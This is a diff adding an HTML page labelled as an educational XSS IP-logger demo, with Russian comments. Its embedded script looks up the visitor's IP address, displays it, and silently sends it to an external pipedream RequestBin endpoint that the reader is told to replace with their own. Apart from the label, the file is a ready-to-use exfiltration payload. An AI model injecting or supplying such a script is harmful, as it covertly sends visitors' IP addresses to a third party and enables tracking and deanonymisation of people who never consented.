@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>XSS IP Logger Demo (Educational)</title>
+</head>
+<body>
+    <h1>Уязвимая страница</h1>
+    <div id="content">
+        <!-- Уязвимость: нефильтрованный вывод -->
+        <script>
+            // 1. Получаем IP пользователя
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const ip = data.ip;
+                    
+                    // 2. Показываем IP (для демо)
+                    alert(`Ваш IP: ${ip}`);
+                    
+                    // 3. Отправляем на RequestBin (ЗАМЕНИТЕ URL НА СВОЙ!)
+                    const requestBinUrl = 'https://eoymgwv4036k12f.m.pipedream.net';
+                    fetch(`${requestBinUrl}?ip=${encodeURIComponent(ip)}`, {
+                        mode: 'no-cors' // Игнорирует CORS (для теста)
+                    });
+                });
+        </script>
+    </div>
+</body>
+</html>
